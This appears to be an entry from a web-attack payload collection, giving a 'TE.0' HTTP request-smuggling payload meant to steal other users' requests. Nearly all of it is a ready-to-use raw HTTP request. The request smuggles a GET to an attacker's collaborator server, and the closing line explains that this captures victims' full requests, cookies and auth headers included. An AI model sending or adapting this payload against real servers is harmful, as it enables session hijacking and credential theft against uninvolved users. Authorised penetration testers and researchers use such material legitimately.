# TE.0 Payload — Steal Victim Requests

Payload to capture/steal subsequent user requests via request smuggling.

```yaml
OPTIONS / HTTP/1.1
Host: {HOST}
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Transfer-Encoding: chunked
Connection: keep-alive

50
GET <http://our-collaborator-server/> HTTP/1.1
x: X
0
EMPTY_LINE_HERE

```

The smuggled GET request redirects the next user's request to an attacker-controlled collaborator server, allowing the attacker to capture the victim's full HTTP request (including cookies, auth headers, etc.).
